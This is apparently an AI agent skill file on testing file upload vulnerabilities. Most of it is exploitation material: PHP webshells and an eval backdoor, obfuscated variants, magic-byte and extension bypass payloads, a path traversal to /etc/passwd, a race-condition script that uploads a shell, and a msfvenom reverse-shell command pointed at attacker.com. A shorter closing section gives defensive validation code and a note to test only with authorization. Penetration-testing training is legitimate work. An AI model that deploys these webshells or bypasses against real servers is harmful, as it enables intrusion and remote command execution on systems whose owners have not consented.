---
name: file-upload-testing
description: Professional skills and methodology for file upload vulnerability testing
version: 1.0.0
---

# File Upload Vulnerability Testing

## Overview

File upload functionality is a common feature in web applications, but it carries multiple security risks. This skill provides methods for detecting, exploiting, and protecting against file upload vulnerabilities.

## Vulnerability Types

### 1. Unvalidated File Type

**Frontend-only validation:**
```javascript
// Can be bypassed
if (!file.name.endsWith('.jpg')) {
  alert('Only image uploads are allowed');
}
```

### 2. File Content Not Validated

**Extension check only:**
```php
// Dangerous code
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
}
```

### 3. Path Traversal

**Unfiltered filename:**
```
filename: ../../../etc/passwd
filename: ..\..\..\windows\system32\config\sam
```

### 4. Filename Override

**Predictable filename:**
```
uploads/1.jpg
uploads/2.jpg
```

## Testing Methods

### 1. Basic Detection

**Test various file types:**
- .php, .jsp, .asp, .aspx
- .php3, .php4, .php5, .phtml
- .jspx, .jspf
- .htaccess, .htpasswd

**Test double extensions:**
```
shell.php.jpg
shell.jpg.php
```

**Test case variations:**
```
shell.PHP
shell.PhP
```

### 2. Content-Type Bypass

**Modify Content-Type:**
```
Content-Type: image/jpeg
# But file content is PHP code
```

**Magic Bytes:**
```php
// Add image header before PHP code
GIF89a<?php phpinfo(); ?>
```

### 3. Parser Vulnerabilities

**Apache parser vulnerability:**
```
shell.php.xxx  # Apache may parse as PHP
```

**IIS parser vulnerability:**
```
shell.asp;.jpg
shell.asp:.jpg
```

**Nginx parser vulnerability:**
```
shell.jpg%00.php
```

### 4. Race Condition

**Access file immediately after upload:**
```python
# Upload .php file, access before deletion completes
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    time.sleep(0.1)
    requests.get('http://target.com/uploads/shell.php?cmd=id')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

## Exploitation Techniques

### PHP WebShell

**Basic WebShell:**
```php
<?php system($_GET['cmd']); ?>
```

**One-liner backdoor:**
```php
<?php eval($_POST['a']); ?>
```

**Bypass filtering:**
```php
<?php
$_GET['cmd']($_POST['a']);
// Usage: ?cmd=system
```

### .htaccess Exploitation

**Upload .htaccess:**
```
AddType application/x-httpd-php .jpg
```

**Then upload shell.jpg (which is actually PHP code)**

### Image Webshell

**GIF image webshell:**
```php
GIF89a
<?php
phpinfo();
?>
```

**PNG image webshell:**
```bash
# Use tool to embed PHP code into PNG
python3 png2php.py shell.php shell.png
```

### Combined with File Inclusion

**If a file inclusion vulnerability exists:**
```
# Upload image containing PHP code
# Then execute via file inclusion
?file=uploads/shell.jpg
```

## Bypass Techniques

### Extension Bypass

**Double extension:**
```
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
```

**Case variation:**
```
shell.PHP
shell.PhP
```

**Special characters:**
```
shell.php.
shell.php
shell.php%20
```

### Content-Type Bypass

**Modify request headers:**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes Bypass

**Add file headers:**
```php
// JPEG
\xFF\xD8\xFF\xE0<?php phpinfo(); ?>

// GIF
GIF89a<?php phpinfo(); ?>

// PNG
\x89\x50\x4E\x47<?php phpinfo(); ?>
```

### Code Obfuscation

**Use short tags:**
```php
<?= system($_GET['cmd']); ?>
```

**Use variables:**
```php
<?php
$a='sys';
$b='tem';
$a.$b($_GET['cmd']);
```

## Tool Usage

### Burp Suite

1. Intercept file upload requests
2. Modify filename and content
3. Test various bypass techniques

### Upload Bypass

```bash
# Test file upload with various techniques
python upload_bypass.py -u http://target.com/upload -f shell.php
```

### WebShell Generation

```bash
# Generate various WebShells
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
```

## Validation and Reporting

### Validation Steps

1. Confirm the ability to upload malicious files
2. Verify the file can be executed
3. Assess impact (command execution, data leakage, etc.)
4. Document complete POC

### Reporting Key Points

- Vulnerability location and upload functionality
- File types that can be uploaded and execution methods
- Complete exploitation steps and PoC
- Remediation recommendations (file type validation, content checking, secure storage, etc.)

## Protective Measures

### Recommended Solutions

1. **File Type Whitelist**
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
   ext = filename.rsplit('.', 1)[1].lower()
   if ext not in ALLOWED_EXTENSIONS:
       raise ValueError("File type not allowed")
   ```

2. **File Content Validation**
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if not file_type.startswith('image/'):
       raise ValueError("Invalid file content")
   ```

3. **Rename Files**
   ```python
   import uuid
   filename = str(uuid.uuid4()) + '.' + ext
   ```

4. **Isolated Storage**
   - Store files outside the web root directory
   - Access via proxy script
   - Disable execution permissions

5. **File Scanning**
   - Scan with antivirus software
   - Check file content
   - Remove executable permissions

6. **Size Limit**
   ```python
   MAX_SIZE = 5 * 1024 * 1024  # 5MB
   if file.size > MAX_SIZE:
       raise ValueError("File too large")
   ```

## Notes

- Only perform testing in authorized test environments
- Avoid uploading malicious files to production environments
- Clean up promptly after testing
- Be aware of parsing differences across different servers
